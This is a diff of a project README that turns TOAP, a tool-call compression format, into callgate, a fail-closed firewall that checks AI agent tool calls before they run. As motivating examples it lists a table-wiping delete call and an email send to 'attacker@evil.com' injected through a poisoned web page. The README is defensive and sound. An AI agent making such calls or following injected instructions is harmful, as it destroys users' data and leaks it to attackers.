@@ -1,117 +1,78 @@
-# TOAP — Token-Optimized Agent Protocol
+# callgate
 
-> **v0.1.1-alpha** — Gemini-validated. **Pilot Insert Kit** in progress (meter + schema + plain insert).  
-> Not production-ready. Cross-model (GPT/Claude) not run (no budget). Community self-pay benches are optional, not the primary validation path.
+> **Fail-closed firewall for AI agent tool calls.**
+> Structured outputs guarantee your agent's tool calls are *well-formed*. callgate guarantees they're *allowed*.
 
-Middleware that compresses the *serialized representation* of AI agent tool calls into a compact DSL, then expands via a proxy before tools run.
-
----
-
-## What is this?
-
-When AI agents talk to each other, they use bloated JSON. TOAP replaces that with a compressed syntax:
-
-```
-§T[sec_vuln_huawei_2026]
-ƒ(DB_SRC)>q:"Huawei Cloud vulnerabilities"|l:5
-```
-
-Instead of:
-```json
-{"thought": "...", "action": "query_database", "params": {"query": "...", "limit": 5}}
-```
-
-**Honest status:** LangChain/CrewAI demos exist (greenfield). Drop-in into an *existing* production agent is still early; use the plain Gemini pilot example to measure locally.
+**Status: v0.2.0-dev — Phase 0 (core) in progress. Not released, not on PyPI yet.**
 
 ---
 
-## What's included
+## The problem
 
-| Component | Path | Description |
-|---|---|---|
-| **SDK** | `toap-python/` | Parser, proxy, meter, schema gate, encoder, CLI, adapters |
-| **Pilot path** | `toap-python/examples/pilot_plain_gemini.py` | Offline/live multi-hop A/B + CSV/JSON meter export |
-| **Community test** | `COMMUNITY_TEST.md` | Optional self-serve harness steps |
-| **Benchmark** | `toap-bench/` | Synthetic Gemini Tier-1 harness + reports |
+Constrained decoding solved malformed JSON. It did nothing for this:
 
----
+```python
+delete_records(filter={})            # perfectly valid JSON. whole table gone.
+send_email(to="attacker@evil.com")   # address injected via a poisoned web page
+db_query(limit=10_000_000)           # schema-valid. production melts.
+```
 
-## Quick Start
+Every one of these is a **valid-but-wrong** call. Nothing in the platform stack blocks it.
+
+## What callgate does
+
+```
+LLM tool call (OpenAI / Anthropic / Gemini native JSON — no custom format)
+        │
+        ▼
+   ┌─ callgate ────────────────────────────────┐
+   │  registered tool?  schema ok?  policy ok? │──BLOCK──► logged, never executed
+   └───────────────┬───────────────────────────┘
+                   ▼ ALLOW
+              tool(**args)
+```
+
+```python
+from callgate import Gate, Meter, ToolSchema
+
+gate = Gate(default="deny", meter=Meter())     # fail closed, audit on
+gate.register("db_query", db_query, schema=ToolSchema(required=["q"], types={"q": str, "limit": int}))
+
+result = gate.run(openai_response)             # any provider shape, or a plain dict
+# result.verdict: ALLOW | BLOCK — blocked calls never execute
+```
+
+- **Zero required dependencies** — stdlib only, drops into any Python agent
+- **Fail-closed** — unknown tool, schema violation, unparseable payload: blocked
+- **Audit trail** — every verdict exported to JSON/CSV (`callgate report audit.json`)
+
+**Honest status:** today's gate covers tool registration + schema (required args, types).
+The policy engine that blocks *value-level* dangers from the examples above — empty
+filters, out-of-range limits, non-allowlisted email domains — is the next cycle (see
+roadmap). Claims will only ever match what the published failure suite proves.
+
+Try it without an API key:
 
 ```bash
-# 1. Install SDK
-cd toap-python
-pip install -e .
-
-# 2. Offline pilot (no API cost) — meter A/B CSV
-python examples/pilot_plain_gemini.py
-
-# 3. Quickstart (parse + proxy + meter)
-python examples/quickstart.py
-
-# 4. Optional live Gemini / framework demos (needs GEMINI_API_KEY)
-pip install -e ".[langchain-gemini,crewai-gemini]"
-python examples/langchain_agent.py
-python examples/crewai_agent.py
+cd callgate && pip install -e . && python examples/quickstart.py
 ```
 
----
+## Roadmap (Phase 0 → 1)
 
-## Gemini Test Results (by author)
+- [x] Provider intake (OpenAI chat + responses, Anthropic, Gemini, plain dict)
+- [x] Fail-closed gate + schema layer + audit meter
+- [ ] Policy engine: value constraints, allow/deny lists, approval flags, budget caps
+- [ ] Failure-scenario suite (8 attack classes) — published block-rate per release
+- [ ] Dry-run mode: full agent run, zero execution, "would-have-done" report
+- [ ] `callgate-mcp`: guard proxy wrapping any MCP server
+- [ ] PyPI release
 
-Tested on **Gemini 3.5 Flash Lite** with few-shot prompting (2 examples):
+## What happened to TOAP?
 
-| Metric | Result |
-|---|---|
-| TOAP format compliance | **100%** (16/16 runs, Tier 1) |
-| Tool execution accuracy | **93.8%** (with arg alias normalization) |
-| Output token savings vs JSON | **~45%** (output only) |
-| Net token savings (incl. prompt) | **~5-6%** (few-shot prompt is ~400 tokens) |
-
-Full details: [`toap-bench/results/REPORT.md`](toap-bench/results/REPORT.md)
-
----
-
-## Community Request
-
-I've only tested this on **Gemini**. I need your help testing on:
-
-- **OpenAI GPT-4o**
-- **Anthropic Claude 3.5 Sonnet**
-
-See **[COMMUNITY_TEST.md](COMMUNITY_TEST.md)** for step-by-step instructions. Takes ~10 minutes and ~$5 in API credits.
-
-Please share your results — compliance %, accuracy %, and token savings.
-
----
-
-## Architecture
-
-```
-Your Framework (LangChain / CrewAI)
-        |
-TOAP Proxy (parse + validate + alias normalize)
-        |
-LLM API (Gemini / GPT-4o / Claude)
-```
-
----
-
-## Status
-
-| Phase | Status |
-|---|---|
-| Phase 0 — Benchmark | Gemini validated, Claude/GPT pending community |
-| Phase 1 — SDK | Alpha release (this repo) |
-| Phase 2 — API Gateway | Not started |
-| Phase 3 — Observability SaaS | Not started |
-
----
+This repo used to be **TOAP**, a token-compression DSL for tool calls. We measured it honestly and killed it — the full postmortem (real numbers, tokenizer analysis, lessons) is on the [`toap-v0.1-archive`](https://github.com/Dev-Saif-Ops/Project_TOAP/tree/toap-v0.1-archive) branch. callgate keeps the part of TOAP that was never about compression: the fail-closed checkpoint between the model and your tools.
 
 ## License
 
-MIT — see [`toap-python/LICENSE`](toap-python/LICENSE)
+MIT — see [LICENSE](LICENSE)
 
----
-
-Built by [Mohammad Safwan Athar](https://github.com/Dev-Saif-Ops) | Initial release August 2026
+Built by [Mohammad Safwan Athar](https://github.com/Dev-Saif-Ops)
